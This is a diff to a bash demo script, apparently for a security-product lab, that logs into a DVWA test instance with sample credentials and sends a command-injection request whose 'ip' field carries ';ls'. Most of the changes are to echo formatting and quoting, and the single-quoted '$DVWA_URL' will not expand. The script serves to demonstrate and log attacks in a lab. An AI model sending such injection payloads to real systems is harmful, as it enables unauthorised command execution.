@@ -339,7 +339,7 @@ Command_Injection() {
     echo ""
     echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${WHITE_BOLD}pablo${RESTORE} password=${WHITE_BOLD}letmein${RESTORE}"
     echo ""
-    curl '${DVWA_URL}/login.php' \
+    curl '$DVWA_URL/login.php' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
@@ -350,8 +350,9 @@ Command_Injection() {
         --data-raw 'username=pablo&password=letmein&Login=Login' \
         -c cookie.txt
 
-    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/exec/${RESTORE} submit=${RED_BOLD}\";ls\"\n"
-    curl -s '${DVWA_URL}/vulnerabilities/exec/' \
+    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/exec/${RESTORE} submit=${RED_BOLD}\";ls\""
+    echo ""
+    curl -s '$DVWA_URL/vulnerabilities/exec/' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
@@ -362,7 +363,8 @@ Command_Injection() {
         --data-raw 'ip=;ls&Submit=Submit' \
         -b cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'
 
-    echo -en "\n\n${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
+    echo ""
+    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
     read response
     return 1
 }
